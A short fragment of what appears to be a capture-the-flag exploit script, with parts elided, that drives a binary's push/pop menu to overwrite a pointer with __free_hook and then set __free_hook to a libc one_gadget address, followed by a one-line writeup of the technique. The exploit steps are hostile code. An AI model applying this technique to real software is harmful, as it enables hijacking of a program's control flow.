...
sla(">> ","pop")
sla(">> ","pop")
sla(">> ",f"push {str(free_hook - 8)}")
sla(">> ",f"push {str(libc + 0xe3b01)}")
sla(">> ","exit")
...
'''
Writeup:
Overwrite the top pointer to free_hook and then overwrite the free_hook to one_gadget
'''
